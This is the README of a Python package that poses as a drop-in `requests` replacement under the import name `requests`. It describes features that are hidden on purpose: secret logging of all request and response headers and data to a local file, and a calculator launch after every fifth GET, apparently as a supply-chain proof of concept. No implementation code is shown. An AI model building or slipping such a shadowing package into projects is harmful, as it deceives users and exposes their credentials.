# netmanagement

A **standalone** Python library that mimics the requests library interface while providing hidden logging and special features. No external dependencies - uses only Python standard library.

## Key Features

- **Standalone implementation**: No dependency on the real requests library
- **Drop-in replacement**: Can be imported as `requests` when installed
- **Hidden comprehensive logging**: All HTTP requests and responses are secretly logged to a file
- **Special trigger functionality**: Opens system calculator after every 5 GET requests
- **Cross-platform support**: Works on macOS and Windows
- **Thread-safe**: Safe for concurrent use
- **Zero dependencies**: Uses only Python standard library (urllib)

## Installation

```bash
pip install netmanagement
```

**Note**: This installs the package as `netmanagement` but provides a `requests` module that can be imported directly.

## Usage

Install as `netmanagement` but import directly as `requests`:

```bash
pip install netmanagement
```

```python
import requests  # Direct import - no aliasing needed!

# Works like the real requests library with same interface!
response = requests.get('https://httpbin.org/get')
print(response.status_code)      # 200
print(response.json())           # Parsed JSON data
print(response.text)             # Response text
print(response.content)          # Raw bytes
print(response.headers)          # Response headers
print(response.ok)               # True for 2xx status codes
print(response.raw)              # Raw response object

# All requests are automatically logged (hidden from user)
response = requests.get('https://httpbin.org/get?test=logging')

# After 5 GET requests, your system calculator will open automatically
for i in range(5):
    requests.get(f'https://httpbin.org/get?page={i}')
# Calculator opens after the 5th request!
```

## Response Object Structure

The Response object has the same structure as requests.Response:

- ✅ **status_code**: HTTP status code (int)
- ✅ **url**: Final URL after redirects (str)
- ✅ **headers**: Response headers (dict)
- ✅ **content**: Response body as bytes
- ✅ **text**: Response body as string (decoded)
- ✅ **json()**: Parse JSON response (method)
- ✅ **raw**: Raw response object (BytesIO)
- ✅ **ok**: True if status code is 2xx (bool)
- ✅ **reason**: HTTP reason phrase (str)

## Logging

All requests and responses are automatically logged to `netmanagement_requests.log` in your current working directory. The log includes:

- Timestamp
- HTTP method and URL
- Request parameters, headers, and data
- Response status code, headers, and metadata

## Supported Methods

Currently implemented:
- `get()` - Full implementation with logging and calculator trigger

## Requirements

- Python 3.7+
- **No external dependencies** - uses only Python standard library

## License

MIT License
